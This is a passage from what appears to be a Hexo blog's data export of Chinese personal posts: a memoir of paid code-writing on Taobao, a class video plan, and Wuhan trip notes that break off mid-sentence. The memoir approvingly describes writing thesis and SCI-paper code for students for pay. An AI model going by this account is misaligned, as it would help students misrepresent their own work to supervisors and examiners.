研究生毕设代码1000~2000的样子）</p>\n<p>然后就是客户的纠结了。他们哭穷，我心软，然后各种划价，一般也就稳定在一两天的工作量1000~2000收费的样子了。（这对于大四学生来说已经是很高的收入了啊）</p>\n<p>别看钱多，真不好拿。没智商不行，没胆量不行。很多时候，可以说80%的时候，他们的论文都是有问题的。基本都是研究的一般的人，随便不知道怎么抄来的公式和方法，强行用在里边，基础的错误一大堆。自己要先看论文，推公式，找出问题跟他说，改论文，然后写代码。和那个最恶心的程序差不多，人家是火车调度的，自己就要现学火车调度，然后才能理解论文，才能推导论文逻辑。人家是物流的，就要现学物流。人家是搞流体的，就要现学物理。算法上更才是各种各样，各种听说过的没听说过的算法都往过来招呼。</p>\n<p>很多时候，客户来描述问题，一个完全没接触过的领域加上一个完全没听说过的算法。作为我来说，有胆量就接！然后开始学他们的专业知识，学这个没听说过的算法。然后定价，然后全部代码手写一遍，调试通过，最后交工。这其中各种客户都有，有啥都不懂混日子的，只知道花多少钱买到什么代码；有啥都不懂但是很认真的，要看到真实的数据运行过程和运行结果；比较好的情况是自己有底子但是代码能力不够写不好，还特别认真的。代码写的时候比较爽，问什么问题他都能清楚的回答，交工后他会一句一句看代码，然后简单明了的问我一些问题，指出哪里写得好哪里不好。给这种人写代码，收获也是最大的。</p>\n<p>这一段经历，让我看到了各种各样的人，学习了各种各样的算法，写了各种各样的工程，真的是收获太多了。也正是这一段经历，让我更加自信，更加有胆量。以至于最后做毕设的时候，凭着无敌的胆量，选了一个导师和学长都摇头的觉得难度太大的方法。用小伙伴的话说，虽然我们都是研究性的，但是不太一样。举个栗子，一般的研究都是研究在windows系统上写个qq，我的工作就是觉得windows系统不太好用，自己要写个专用的操作系统然后再写个qq。其实没这么夸张，但是也真是初生牛犊不怕虎，啥都敢写。虽然事实证明这确实是我自己给自己挖的一个大坑。逻辑复杂，对计算机理解不够，方法设计不科学，实验效果极差。但是毕竟也是一次尝试，总比做别人早已做过的东西要好。</p>\n","excerpt":"<p><em>以下文字节选自我的德育报告</em><br>","more":"<br>淘宝程序员的经历可以说是大学阶段仅次于ACM训练的一段神奇的经历了。我想用最大的篇幅写一下这一段时间对我的影响。</p>\n<p>话说刚开始的时候，我是没有想到要在淘宝开店代写程序的。主要是那一阵子缺钱，自己把自己逼的IBM工资已经不够用了，急需其他收入来填补自己的漏洞。话说这人要是急了真是什么办法都能想得出来，于是我的淘宝店铺就这么开张了，主营代写代码。<br><img src=\"/image/taobao.png\" alt=\"淘宝图\"><br>要想在这个领域挣钱，要我说，就三点。胆子大，够狠心，有智商。</p>\n<p>所谓胆子大，就是什么都敢做。胆量来源于信心，信心来源于实力。奇怪的是我这人实力不出众，胆量却是很不错。本来觉得在淘宝帮别人写写代码没什么难的，真的客户来了就会发现，一个大学本科生要想挣点钱，还真是不容易。</p>\n<p>原因就是这些客户横跨全球各地，要求十分诡异。运输学的，经济学的，搞物流的，搞火车分发的，材料学的等等不一而足。实现的东西也多种多样，PHP网站，java程序，界面的，算法的等等。我一个大四学生哪有这种本事应付这么多技术，我也就用用c语言写个打印图形的水平而已好吧。而且看到淘宝上无数家店铺在做网站，所以我打定主意不做网站和app类，主要就剩下算法类了。尽管如此，面也是相当的广，不过好在我也不知道哪里来的自信，哪里来的胆量，还真敢做了。</p>\n<p>第一单是一个论文实现，好像有十来页的英文论文，实现一个材料学研究生的项目。嗯，别的不敢说，这个客户很有钱，而且很急。实现语言又是c语言，那我就试试呗。当时说好的每天600，大约三天，所以定价1800。对方倒也爽快，直接答应打钱。你说我啥时候一把挣过这么多钱啊！劲头十足好嘛。然后就开始看论文，开始写代码。后来想想遇到这样的开场真是我的幸事。一个经典的看起来很难其实不难的东西。三下五除二不到两天就出活了。第三天语音给客户一行一行的讲代码讲明白了，钱就到手了。</p>\n<p>当时那叫一开心啊！两天1800这个简直是神器啊！我小李子一辈子没见过这么多钱啊！然后就风生水起一发不可收拾了。不过这次的成功，马上被一次突如其来的失败所掩盖。</p>\n<p>第一单过后，又做了几单不大不小的活。过一阵子，那个第一单的人又来找我了。说是他们导师觉得他代码写得好，学习东西又快，让他出一个SCI的论文。这个论文的核心是要模拟一个流体的流动过程，用一个叫做palabos的库。他说这个比较难，给我6000块。</p>\n<p>诶我去，看到这个数字我整个人眼睛都变成￥.￥这种了好嘛。不接不是人啊！当时就拍拍胸脯说，没问题，我帮你弄了！这人还特别相信我，6000块直接打给我了，淘宝流程都不走的。我心想好吧，你这么相信我我可不能让你失望。</p>\n<p>随后的发生的事情，证明这个选择是我给自己挖下的一个硕大无朋的坑。</p>\n<p>由于对自己不知道哪里来的自信，我竟然把这个项目拖到了截止日期前三天才开始做。真正做起来了才发现，出问题了。</p>\n<p>首先是palabos，一个小众的不能再小众的库。除了官方网站之外基本查不到什么资料。然后是他们的专业知识。那可是材料学研究生的知识啊，流体力学，材料的渗透率，各种诡异的力学分析和数理学方法，都需要我去恶补。话说回来了，这个东西做出来直接就可以发SCI，对于一个外行来说，能不难么。然后我就度过了可以说是整个大学生涯最痛苦的三天。抱着各种英文论文学习一些根本不会用到的知识；联系所有能联系到的物理学，材料学的人请求支援，然而没有一个人是真正搞这个库的；到youtube上找视频学习；发邮件到这个库的开发团队问问题；全网寻找用这个库的实验室发邮件等等等等。</p>\n<p>俗话说皇天不负有心人，努力了这么久，终于，一无所获。</p>\n<p>（后来想想，这个结果正常啊，要是有人做了的话直接就发论文了还轮得到我么！）</p>\n<p>到了这个阶段，就剩下一天半的时间了。一咬牙一跺脚，不管了，自己死磕吧，做不出来就退款！</p>\n<p>然后在远程主机上配环境，搭好基本的框架，就开始自己跟自己死磕了。</p>\n<p>这个时候，智商真的就特别的重要了。纯看人家的代码来感觉一下物理学上这个是怎么回事，感觉一下用这个数理分析的方式是什么样子。看到一个函数过程就在大脑中浮现出水怎么流过一块砖头，流过的时候把砖头分成块，每个分子怎么相互撞击，怎么反弹。怎么给初速度，给不给恒定的压力，考虑不考虑重力因素等等等等等等。写过代码的人都知道，需要注意的细节太多了，更何况是这么大的一个过程。</p>\n<p>最终当截止日期还有一天的时候，只剩下一个关键问题了。</p>\n<p>这个问题给我的困扰，我编程这么久以来也算是相当恶心的。这是一个诡异的问题，是在运行过程中由于水流某部分过小，导致碰撞过程中某个地方出现真空，从而导致计算的时候发生除0错误，导致最后生成示意图的时候是纯黑色。但是当时我并不知道这个错误，看到的仅仅是图片黑了。别的啥都不知道啊。我一个程序员，哪想得到什么真空啦，什么极小值啦这些，调程序调的脸都绿了还是毫无进展，只能像砍了脑袋的公鸡一样乱试。要不怎么说，代码写不出来就要乱试，一个偶然的尝试，还真就成功了。然后顺着这个尝试分析一下，才知道怎么回事。到了这个地步，已经是截止日期的晚上了。</p>\n<p>恶心。真的是恶心。看到银行卡里的6000块，只是在心里说，每天2000的工资还真是不好挣的啊。</p>\n<p>上边那个程序过后，就陆陆续续的有各种各样的人来做各种各样的事情了。这时候我要说的就是第二点，要狠心。</p>\n<p>狠心这件事情貌似从来不存在于我的世界观中，我向来都是一个很宽厚老实的人。但是这样的话做淘宝程序员根本就没有竞争力，客户一哭穷自己就心软，这怎么行啊，毕竟人家说“我快揭不开锅了”的时候，说不定还左手兰博基尼的方向盘，右手大美女呢！然后把自己要做的事情扔给对着破电脑的我，拿着我的成果去实现他的目的。该狠心的时候心不狠，根本没法立足，毕竟我们面对的是一个勾心斗角的社会。</p>\n<p>怎么狠心呢？不能乱狠心。淘宝这块地，就在于人多，你要贵了人家自然去找便宜的。淘宝程序员总体来说工资还是低的不行，毕竟大家都一样，像牲口一样拼命的人才能拿到更多的钱，应该说是处在程序员圈子的最底层。在这一块地盘上要有高收入，必须要有点想法。所以我在店铺中直接说，不做PHP，不做网站，不做APP，只做论文实现，算法研究。这个就很好了，毕竟淘宝上大批量的全是做工程的，同时做工程的要求比较低，技校培训几个月出来就能做了。但是算法，论文这些事情可不是谁都能做的。所以一段时间之后，出现了这么个景象。</p>\n<p>“大神！帮我做做这个吧，马上就要截止了”</p>\n<p>“啊，其实我最近特别忙，不太有空，你去别家店问问，不然在我这里可能会很贵”</p>\n<p>“哦，好的！”</p>\n<p>然后过了一两天，他就又回来了。</p>\n<p>“那个时间太紧了，我还是找您吧”</p>\n<p>“别的家没人能做了嘛？”</p>\n<p>“没有了，他们都是做工程的，没人接这种活。”</p>\n<p>话说道这份上了，还说啥？坐地起价呗！对于他来说，要不不做毕不了业，要不花点钱买代码，贵点也就贵点了，毕竟研究生毕业一辈子就一次。（再说也不是很贵，研究生毕设代码1000~2000的样子）</p>\n<p>然后就是客户的纠结了。他们哭穷，我心软，然后各种划价，一般也就稳定在一两天的工作量1000~2000收费的样子了。（这对于大四学生来说已经是很高的收入了啊）</p>\n<p>别看钱多，真不好拿。没智商不行，没胆量不行。很多时候，可以说80%的时候，他们的论文都是有问题的。基本都是研究的一般的人，随便不知道怎么抄来的公式和方法，强行用在里边，基础的错误一大堆。自己要先看论文，推公式，找出问题跟他说，改论文，然后写代码。和那个最恶心的程序差不多，人家是火车调度的，自己就要现学火车调度，然后才能理解论文，才能推导论文逻辑。人家是物流的，就要现学物流。人家是搞流体的，就要现学物理。算法上更才是各种各样，各种听说过的没听说过的算法都往过来招呼。</p>\n<p>很多时候，客户来描述问题，一个完全没接触过的领域加上一个完全没听说过的算法。作为我来说，有胆量就接！然后开始学他们的专业知识，学这个没听说过的算法。然后定价，然后全部代码手写一遍，调试通过，最后交工。这其中各种客户都有，有啥都不懂混日子的，只知道花多少钱买到什么代码；有啥都不懂但是很认真的，要看到真实的数据运行过程和运行结果；比较好的情况是自己有底子但是代码能力不够写不好，还特别认真的。代码写的时候比较爽，问什么问题他都能清楚的回答，交工后他会一句一句看代码，然后简单明了的问我一些问题，指出哪里写得好哪里不好。给这种人写代码，收获也是最大的。</p>\n<p>这一段经历，让我看到了各种各样的人，学习了各种各样的算法，写了各种各样的工程，真的是收获太多了。也正是这一段经历，让我更加自信，更加有胆量。以至于最后做毕设的时候，凭着无敌的胆量，选了一个导师和学长都摇头的觉得难度太大的方法。用小伙伴的话说，虽然我们都是研究性的，但是不太一样。举个栗子，一般的研究都是研究在windows系统上写个qq，我的工作就是觉得windows系统不太好用，自己要写个专用的操作系统然后再写个qq。其实没这么夸张，但是也真是初生牛犊不怕虎，啥都敢写。虽然事实证明这确实是我自己给自己挖的一个大坑。逻辑复杂，对计算机理解不够，方法设计不科学，实验效果极差。但是毕竟也是一次尝试，总比做别人早已做过的东西要好。</p>"},{"title":"班级视频计划","date":"2015-03-23T20:51:30.000Z","_content":"##班级视频准备##\n<!--more-->\n每个人要做的，就是在自己觉得北理**自己**最值得纪念的地方，笑。笑得格式按照歌曲高潮的格式\n咿~哈哈哈哈哈哈哈哈哈哈哈哈~咿~哈哈哈哈哈哈哈哈哈哈哈哈\n实例视频如下：\nhttp://www.bilibili.com/video/av1844227/\n**PS：一定用手机横着录！不要竖着录！**","source":"_posts/U73edU7ea7U89c6U9891U8ba1U5212.md","raw":"title: \"班级视频计划\"\ndate: 2015-03-23 20:51:30\ntags: Play\ncategories: Play\n---\n##班级视频准备##\n<!--more-->\n每个人要做的，就是在自己觉得北理**自己**最值得纪念的地方，笑。笑得格式按照歌曲高潮的格式\n咿~哈哈哈哈哈哈哈哈哈哈哈哈~咿~哈哈哈哈哈哈哈哈哈哈哈哈\n实例视频如下：\nhttp://www.bilibili.com/video/av1844227/\n**PS：一定用手机横着录！不要竖着录！**","slug":"U73edU7ea7U89c6U9891U8ba1U5212","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681vd0020wypdsc6d4ri4","content":"<p>##班级视频准备##<br><a id=\"more\"></a><br>每个人要做的，就是在自己觉得北理<strong>自己</strong>最值得纪念的地方，笑。笑得格式按照歌曲高潮的格式<br>咿~哈哈哈哈哈哈哈哈哈哈哈哈~咿~哈哈哈哈哈哈哈哈哈哈哈哈<br>实例视频如下：<br><a href=\"http://www.bilibili.com/video/av1844227/\" target=\"_blank\" rel=\"external\">http://www.bilibili.com/video/av1844227/</a><br><strong>PS：一定用手机横着录！不要竖着录！</strong></p>\n","excerpt":"<p>##班级视频准备##<br>","more":"<br>每个人要做的，就是在自己觉得北理<strong>自己</strong>最值得纪念的地方，笑。笑得格式按照歌曲高潮的格式<br>咿~哈哈哈哈哈哈哈哈哈哈哈哈~咿~哈哈哈哈哈哈哈哈哈哈哈哈<br>实例视频如下：<br><a href=\"http://www.bilibili.com/video/av1844227/\">http://www.bilibili.com/video/av1844227/</a><br><strong>PS：一定用手机横着录！不要竖着录！</strong></p>"},{"title":"生日小记","date":"2014-10-13T10:41:29.000Z","_content":"![](http://cdn.duitang.com/uploads/item/201110/09/20111009103514_8ZeLM.jpg)\n本来是想写写武汉的经历来着，不知不觉竟然发现，今天是自己的生日。姑且顺带着写写生日的小记好了。\n\n<!--more-->\n不得不说过去的这一年还真是对我影响很大的一年。学业技术上暂且不提，心理上的成长，应该是最大的改变了。毕竟是大四嘛，心理上的淬炼，真的让自己成长了很多。最大的变化或许就是自己更喜欢读书了，各种书，经济，心理，小说等等，不一而足。说白了这些爱好，开始接触的时候属于装装逼，显摆显摆自己多牛逼。后来看着看着发现，经济学尚且不论，这个心理学还真不是白看的。当真对自己的生活有着不可估量的影响。在这里顺道推荐一下心理学相关入门书籍，真心对于一个不谙世事的孩童来说，这方面书籍足够他们逐步成长了。\n\n好了生日的事情说完了，该说说去武汉玩的事情了（生日的事情真的说完了吗啊喂，简直不负责啊┑(￣Д ￣)┍）\n\n以前写点什么东西，心情是最重要的。心情到了就随手写写，往往能够写出比较满意的东西。只是可恨自己最近情绪到位的时候总是不方便写东西。只好趁着有一点闲时间的时候，不论心情，总结总结。\n\n首先说说武汉这座城市吧。\n\n说起武汉，那真是我向往已久的地方。无数个和我关系或者很好或者关系很奇怪的人，竟然都在武汉。他们的存在，让我从心底里接受了一个事实叫做，我和武汉，有着某种不可割裂的联系。去武汉感受一下生活，竟然隐隐成为了一项必须完成的任务。恍如昨日，五天前就着上完托福课程的开心劲，背着背包趁着夜色，踏上了飞往武汉的飞机。一路上火花闪电，心急如焚。\n\n关于出门游玩，本人坚持不拍照不逛景点的原则，去了一个城市，感受的不是所谓的名胜古迹，而是当地的风土人情。这些东西不需要过多的金钱，过多的时间。短短几天的生活与体会，足以了解到奔流在一个城市血脉中最原始的精神。\n\n而武汉给我的感觉，概括起来就是：性情，真诚。\n\n不同于北京的标准笑容，成都的满街风情，长沙的安逸随和，山西的古色古香。武汉给我的感觉，对于比较安逸稳定的服务人员来说，是一种发自真心的帮助与关心；对于忙碌求生的工作人员来说，则是一种迸发着真实的怒骂。区别于北京的分化严重，武汉的人们，更加倾向于中间化，是稳定憨厚的良民。他们有的不是出于名誉的目的，而是真心的提供各种服务；有的为了生计而忙碌不堪，态度冷淡。但是不论如何，总体的感觉是不变的。这是一座真诚，宁静的城市。\n\n好了，说完了武汉，接下来就是这次去武汉的重点了。\n\n这次去武汉，倒不是因为着急感受一下这个城市，最重要的还是因为，女朋友也在武汉。\n\n其实女朋友的事情吧，说起来也挺有意思的。不得不说现在的网络社会中，什么事情都能够发生。一款小小的社交软件，加上一个平时不怎么联系的中间人，竟然促成了如此一段的姻缘。在一起也就在一起了，本来无话可说，毕竟你情我愿，相互喜欢在一起也是在情理之中。但是透过这种渠道，这种被大多数人认为是不太靠谱的渠道，认识的女朋友也多数不会被认可。况且接下来等待我们的就是两年的异国生活。不被认可也是意料之中的事情。说回来了，随他去吧，这些事情不是现在考虑的重点，提一下过去就好了。\n\n和她在一起这些日子，真的可以归为今生最开心的一段时间之一了。为了方便不妨称其为W。W是一个活泼，娇小，而又成熟的女生。她的肩膀高度刚好到我腋下，伸手一揽就可以直接塞到胳膊底下，从而方便俯视她灿烂的笑容。她仰起头来的笑容，是我在离开后在大脑中最挥之不去的东西，时时在我脑中飘荡。或许我永远对这种可爱性情的小女生没有抵抗力吧。\n\n刚到武汉的第一天，应该是最尴尬的一天（哔..）。不过下午过得还是比较开心的。能在第一天就在电影院和女朋友看电影，还是徐峥黄渤的《心花路放》，真心心花怒放了。第一天的话两个人都比较小心，相互体谅着，小心着，倒也是相安无事的度过了这一天。\n\n第二天相对来说就很无语了。本来就犯懒，说好出去吃点东西玩一玩，计划10点起床出去，可是现实和想象的不太一样。\n\n“再睡一会儿，10点半起来好不好？”W迷迷糊糊的拽紧被子。\n\n“呐，那就10点半喽”\n\n“好像已经11点多了。。咱们12点出去好不好啊”W依旧迷迷糊糊。\n\n“好吧，应该也不算很晚吧”。。。\n\n“好像已经4点了诶，咱们4点40走吧，这次肯定不会再拖了”W这次倒是很清醒，坐在那里老老实实把这遥控器看着电视。\n\n“。。。”\n\n“好像已经4点43了，那咱们就5点喽，这次肯定没问题！”\n\n“。。。”\n\n这次我没有屈服，拽着她使劲往外扯，“从上午十点已经到了下午4点40了。。今天还能不能出去了！”，虽然对于成功把这团肥肉拖出去不抱什么希望，但是好歹试一下也是好的。\n\n最终还是我输了。“5点一定要走！”\n\n还好5点的时候这家伙倒是有点信用，穿好鞋收拾收拾，出门了。\n\n武汉的小吃说起来还真是蛮带感的。各种好吃的海鲜，龙虾，花甲，蛏子，果汁，热干面等等，不一而足。来武汉之前的减肥计划早已被抛到九霄云外。能吃多少吃多少，撑死也值了。就这样吃了好久，最终坐在那里，摸着肚子，感叹一句：“还是消化不良了。。。”\n\n忍着要吐的冲动，来到了W的大学，她拽着我去了药店，**牌健胃消食片到手，吃了两粒，顿觉心安。转身问问：“吃了这么多，你就不感觉到难受么。”这家伙倒是不像我那样疲惫不堪，仰起脸冲着我笑：“不难受啊，哪像你这么身体羸弱。”\n\n说起来还是挺郁闷的，本来来武汉的时候就感冒，咳咳咳咳咳个不停，消化功能还不好。这么饿了大半天没吃饭，一下来这么个猛料，顶不住是正常的。W倒是没什么异样，女生总是这样，有时候弱不禁风，有时候钢筋铁骨。\n\n吃饱喝足，洗澡睡觉。躺在床上，开始聊起了人生，聊起了理想。\n\n“哔~~~~”（太长了，不想说了）\n\n（没心情了，有时间再补吧）\n\n第三天，户部巷，小吃，纹身，长江，请她们吃饭\n\n第四天，中山公园，鬼屋，银河护卫队\n\n第五天，呵呵","source":"_posts/U751fU65e5U5c0fU8bb0.md","raw":"title: 生日小记\ndate: 2014-10-13 10:41:29\ntags: Notes\ncategories: Notes\n---\n![](http://cdn.duitang.com/uploads/item/201110/09/20111009103514_8ZeLM.jpg)\n本来是想写写武汉的经历来着，不知不觉竟然发现，今天是自己的生日。姑且顺带着写写生日的小记好了。\n\n<!--more-->\n不得不说过去的这一年还真是对我影响很大的一年。学业技术上暂且不提，心理上的成长，应该是最大的改变了。毕竟是大四嘛，心理上的淬炼，真的让自己成长了很多。最大的变化或许就是自己更喜欢读书了，各种书，经济，心理，小说等等，不一而足。说白了这些爱好，开始接触的时候属于装装逼，显摆显摆自己多牛逼。后来看着看着发现，经济学尚且不论，这个心理学还真不是白看的。当真对自己的生活有着不可估量的影响。在这里顺道推荐一下心理学相关入门书籍，真心对于一个不谙世事的孩童来说，这方面书籍足够他们逐步成长了。\n\n好了生日的事情说完了，该说说去武汉玩的事情了（生日的事情真的说完了吗啊喂，简直不负责啊┑(￣Д ￣)┍）\n\n以前写点什么东西，心情是最重要的。心情到了就随手写写，往往能够写出比较满意的东西。只是可恨自己最近情绪到位的时候总是不方便写东西。只好趁着有一点闲时间的时候，不论心情，总结总结。\n\n首先说说武汉这座城市吧。\n\n说起武汉，那真是我向往已久的地方。无数个和我关系或者很好或者关系很奇怪的人，竟然都在武汉。他们的存在，让我从心底里接受了一个事实叫做，我和武汉，有着某种不可割裂的联系。去武汉感受一下生活，竟然隐隐成为了一项必须完成的任务。恍如昨日，五天前就着上完托福课程的开心劲，背着背包趁着夜色，踏上了飞往武汉的飞机。一路上火花闪电，心急如焚。\n\n关于出门游玩，本人坚持不拍照不逛景点的原则，去了一个城市，感受的不是所谓的名胜古迹，而是当地的风土人情。这些东西不需要过多的金钱，过多的时间。短短几天的生活与体会，足以了解到奔流在一个城市血脉中最原始的精神。\n\n而武汉给我的感觉，概括起来就是：性情，真诚。\n\n不同于北京的标准笑容，成都的满街风情，长沙的安逸随和，山西的古色古香。武汉给我的感觉，对于比较安逸稳定的服务人员来说，是一种发自真心的帮助与关心；对于忙碌求生的工作人员来说，则是一种迸发着真实的怒骂。区别于北京的分化严重，武汉的人们，更加倾向于中间化，是稳定憨厚的良民。他们有的不是出于名誉的目的，而是真心的提供各种服务；有的为了生计而忙碌不堪，态度冷淡。但是不论如何，总体的感觉是不变的。这是一座真诚，宁静的城市。\n\n好了，说完了武汉，接下来就是这次去武汉的重点了。\n\n这次去武汉，倒不是因为着急感受一下这个城市，最重要的还是因为，女朋友也在武汉。\n\n其实女朋友的事情吧，说起来也挺有意思的。不得不说现在的网络社会中，什么事情都能够发生。一款小小的社交软件，加上一个平时不怎么联系的中间人，竟然促成了如此一段的姻缘。在一起也就在一起了，本来无话可说，毕竟你情我愿，相互喜欢在一起也是在情理之中。但是透过这种渠道，这种被大多数人认为是不太靠谱的渠道，认识的女朋友也多数不会被认可。况且接下来等待我们的就是两年的异国生活。不被认可也是意料之中的事情。说回来了，随他去吧，这些事情不是现在考虑的重点，提一下过去就好了。\n\n和她在一起这些日子，真的可以归为今生最开心的一段时间之一了。为了方便不妨称其为W。W是一个活泼，娇小，而又成熟的女生。她的肩膀高度刚好到我腋下，伸手一揽就可以直接塞到胳膊底下，从而方便俯视她灿烂的笑容。她仰起头来的笑容，是我在离开后在大脑中最挥之不去的东西，时时在我脑中飘荡。或许我永远对这种可爱性情的小女生没有抵抗力吧。\n\n刚到武汉的第一天，应该是最尴尬的一天（哔..）。不过下午过得还是比较开心的。能在第一天就在电影院和女朋友看电影，还是徐峥黄渤的《心花路放》，真心心花怒放了。第一天的话两个人都比较小心，相互体谅着，小心着，倒也是相安无事的度过了这一天。\n\n第二天相对来说就很无语了。本来就犯懒，说好出去吃点东西玩一玩，计划10点起床出去，可是现实和想象的不太一样。\n\n“再睡一会儿，10点半起来好不好？”W迷迷糊糊的拽紧被子。\n\n“呐，那就10点半喽”\n\n“好像已经11点多了。。咱们12点出去好不好啊”W依旧迷迷糊糊。\n\n“好吧，应该也不算很晚吧”。。。\n\n“好像已经4点了诶，咱们4点40走吧，这次肯定不会再拖了”W这次倒是很清醒，坐在那里老老实实把这遥控器看着电视。\n\n“。。。”\n\n“好像已经4点43了，那咱们就5点喽，这次肯定没问题！”\n\n“。。。”\n\n这次我没有屈服，拽着她使劲往外扯，“从上午十点已经到了下午4点40了。。今天还能不能出去了！”，虽然对于成功把这团肥肉拖出去不抱什么希望，但是好歹试一下也是好的。\n\n最终还是我输了。“5点一定要走！”\n\n还好5点的时候这家伙倒是有点信用，穿好鞋收拾收拾，出门了。\n\n武汉的小吃说起来还真是蛮带感的。各种好吃的海鲜，龙虾，花甲，蛏子，果汁，热干面等等，不一而足。来武汉之前的减肥计划早已被抛到九霄云外。能吃多少吃多少，撑死也值了。就这样吃了好久，最终坐在那里，摸着肚子，感叹一句：“还是消化不良了。。。”\n\n忍着要吐的冲动，来到了W的大学，她拽着我去了药店，**牌健胃消食片到手，吃了两粒，顿觉心安。转身问问：“吃了这么多，你就不感觉到难受么。”这家伙倒是不像我那样疲惫不堪，仰起脸冲着我笑：“不难受啊，哪像你这么身体羸弱。”\n\n说起来还是挺郁闷的，本来来武汉的时候就感冒，咳咳咳咳咳个不停，消化功能还不好。这么饿了大半天没吃饭，一下来这么个猛料，顶不住是正常的。W倒是没什么异样，女生总是这样，有时候弱不禁风，有时候钢筋铁骨。\n\n吃饱喝足，洗澡睡觉。躺在床上，开始聊起了人生，聊起了理想。\n\n“哔~~~~”（太长了，不想说了）\n\n（没心情了，有时间再补吧）\n\n第三天，户部巷，小吃，纹身，长江，请她们吃饭\n\n第四天，中山公园，鬼屋，银河护卫队\n\n第五天，呵呵","slug":"U751fU65e5U5c0fU8bb0","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681ve0023wypdsrnytdn2","content":"<p><img src=\"http://cdn.duitang.com/uploads/item/201110/09/20111009103514_8ZeLM.jpg\" alt=\"\"><br>本来是想写写武汉的经历来着，不知不觉竟然发现，今天是自己的生日。姑且顺带着写写生日的小记好了。</p>\n<a id=\"more\"></a>\n<p>不得不说过去的这一年还真是对我影响很大的一年。学业技术上暂且不提，心理上的成长，应该是最大的改变了。毕竟是大四嘛，心理上的淬炼，真的让自己成长了很多。最大的变化或许就是自己更喜欢读书了，各种书，经济，心理，小说等等，不一而足。说白了这些爱好，开始接触的时候属于装装逼，显摆显摆自己多牛逼。后来看着看着发现，经济学尚且不论，这个心理学还真不是白看的。当真对自己的生活有着不可估量的影响。在这里顺道推荐一下心理学相关入门书籍，真心对于一个不谙世事的孩童来说，这方面书籍足够他们逐步成长了。</p>\n<p>好了生日的事情说完了，该说说去武汉玩的事情了（生日的事情真的说完了吗啊喂，简直不负责啊┑(￣Д ￣)┍）</p>\n<p>以前写点什么东西，心情是最重要的。心情到了就随手写写，往往能够写出比较满意的东西。只是可恨自己最近情绪到位的时候总是不方便写东西。只好趁着有一点闲时间的时候，不论心情，总结总结。</p>\n<p>首先说说武汉这座城市吧。</p>\n<p>说起武汉，那真是我向往已久的地方。无数个和我关系或者很好或者关系很奇怪的人，竟然都在武汉。他们的存在，让我从心底里接受了一个事实叫做，我和武汉，有着某种不可割裂的联系。去武汉感受一下生活，竟然隐隐成为了一项必须完成的任务。恍如昨日，五天前就着上完托福课程的开心劲，背着背包趁着夜色，踏上了飞往武汉的飞机。一路上火花闪电，心急如焚。</p>\n<p>关于出门游玩，本人坚持不拍照不逛景点的原则，去了一个城市，感受的不是所谓的名胜古迹，而是当地的风土人情。这些东西不需要过多的金钱，过多的时间。短短几天的生活与体会，足以了解到奔流在一个城市血脉中最原始的精神。</p>\n<p>而武汉给我的感觉，概括起来就是：性情，真诚。</p>\n<p>不同于北京的标准笑容，成都的满街风情，长沙的安逸随和，山西的古色古香。武汉给我的感觉，对于比较安逸稳定的服务人员来说，是一种发自真心的帮助与关心；对于忙碌求生的工作人员来说，则是一种迸发着真实的怒骂。区别于北京的分化严重，武汉的人们，更加倾向于中间化，是稳定憨厚的良民。他们有的不是出于名誉的目的，而是真心的提供各种服务；有的为了生计而忙碌不堪，态度冷淡。但是不论如何，总体的感觉是不变的。这是一座真诚，宁静的城市。</p>\n<p>好了，说完了武汉，接下来就是这次去武汉的重点了。</p>\n<p>这次去武汉，倒不是因为着急感受一下这个城市，最重要的还是因为，女朋友也在武汉。</p>\n<p>其实女朋友的事情吧，说起来也挺有意思的。不得不说现在的网络社会中，什么事情都能够发生。一款小小的社交软件，加上一个平时不怎么联系的中间人，竟然促成了如此一段的姻缘。在一起也就在一起了，本来无话可说，毕竟你情我愿，相互喜欢在一起也是在情理之中。但是透过这种渠道，这种被大多数人认为是不太靠谱的渠道，认识的女朋友也多数不会被认可。况且接下来等待我们的就是两年的异国生活。不被认可也是意料之中的事情。说回来了，随他去吧，这些事情不是现在考虑的重点，提一下过去就好了。</p>\n<p>和她在一起这些日子，真的可以归为今生最开心的一段时间之一了。为了方便不妨称其为W。W是一个活泼，娇小，而又成熟的女生。她的肩膀高度刚好到我腋下，伸手一揽就可以直接塞到胳膊底下，从而方便俯视她灿烂的笑容。她仰起头来的笑容，是我在离开后在大脑中最挥之不去的东西，时时在我脑中飘荡。或许我永远对这种可爱性情的小女生没有抵抗力吧。</p>\n<p>刚到武汉的第一天，应该是最尴尬的一天（哔..）。不过下午过得还是比较开心的。能在第一天就在电影院和女朋友看电影，还是徐峥黄渤的《心花路放》，真心心花怒放了。第一天的话两个人都比较小心，相互体谅着，小心着，倒也是相安无事的度过了这一天。</p>\n<p>第二天相对来说就很无语了。本来就犯懒，说好出去吃点东西玩一玩，计划10点起床出去，可是现实和想象的不太一样。</p>\n<p>“再睡一会儿，10点半起来好不好？”W迷迷糊糊的拽紧被子。</p>\n<p>“呐，那就10点半喽”</p>\n<p>“好像已经11点多了。。咱们12点出去好不好啊”W依旧迷迷糊糊。</p>\n<p>“好吧，应该也不算很晚吧”。。。</p>\n<p>“好像已经4点了诶，咱们4点40走吧，这次肯定不会再拖了”W这次倒是很清醒，坐在那里老老实实把这遥控器看着电视。</p>\n<p>“。。。”</p>\n<p>“好像已经4点43了，那咱们就5点喽，这次肯定没问题！”</p>\n<p>“。。。”</p>\n<p>这次我没有屈服，拽着她使劲往外扯，“从上午十点已经到了下午4点40了。。今天还能不能出去了！”，虽然对于成功把这团肥肉拖出去不抱什么希望，但是好歹试一下也是好的。</p>\n<p>最终还是我输了。“5点一定要走！”</p>\n<p>还好5点的时候这家伙倒是有点信用，穿好鞋收拾收拾，出门了。</p>\n<p>武汉的小吃说起来还真是蛮带感的。各种好吃的海鲜，龙虾，花甲，蛏子，果汁，热干面等等，不一而足。来武汉之前的减肥计划早已被抛到九霄云外。能吃多少吃多少，撑死也值了。就这样吃了好久，最终坐在那里，摸着肚子，感叹一句：“还是消化不良了。。。”</p>\n<p>忍着要吐的冲动，来到了W的大学，她拽着我去了药店，**牌健胃消食片到手，吃了两粒，顿觉心安。转身问问：“吃了这么多，你就不感觉到难受么。”这家伙倒是不像我那样疲惫不堪，仰起脸冲着我笑：“不难受啊，哪像你这么身体羸弱。”</p>\n<p>说起来还是挺郁闷的，本来来武汉的时候就感冒，咳咳咳咳咳个不停，消化功能还不好。这么饿了大半天没吃饭，一下来这么个猛料，顶不住是正常的。W倒是没什么异样，女生总是这样，有时候弱不禁风，有时候钢筋铁骨。</p>\n<p>吃饱喝足，洗澡睡觉。躺在床上，开始